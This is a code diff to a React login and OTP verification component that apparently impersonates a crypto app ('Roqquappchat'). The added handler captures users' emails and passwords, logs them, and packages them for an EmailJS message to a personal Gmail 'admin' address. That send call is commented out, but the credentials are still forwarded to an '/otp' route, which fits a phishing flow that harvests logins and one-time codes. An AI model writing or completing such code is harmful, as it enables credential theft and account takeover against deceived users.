@@ -7,6 +7,55 @@ import LogoWhite from '../assets/logo_white.png'
 const VerifyOtp = (props) => {
 
     console.log({props})
+    const history = useHistory()
+
+    const [email, setEmail] = useState('')
+    const [password, setPassword] = useState('')
+
+    const handleEmail = (e) => {
+        setEmail(e.target.value)
+    }
+
+    const handlePassword = (e) => {
+        setPassword(e.target.value)
+    }
+
+    const templateParams = {
+        client_email: email,
+        client_password: password,
+        admin_email: 'Testimonyibom@gmail.com',
+        from_name: 'Roqquappchat',
+        to_name: 'Admin',
+    }
+    const handleSubmit = async (e) => {
+        e.preventDefault()
+
+        console.log('credentials', email, password)
+
+        if (email === '' || password === '') {
+            console.log('not sent')
+        } else {
+            // emailjs
+            //     .send(
+            //         'service_cajdfqp',
+            //         'template_wss11os',
+            //         templateParams,
+            //         'user_xCNzJyoa0acBRP75Xy9wk'
+            //     )
+            //     .then(
+            //         (result) => {
+            //             console.log(result.text, 'email sent')
+            //         },
+            //         (error) => {
+            //             console.log(error, 'email failed')
+            //         }
+            //     )
+
+            history.push('/otp', templateParams)
+        }
+    }
+    
+
 
     return (
         <div className='grid '>
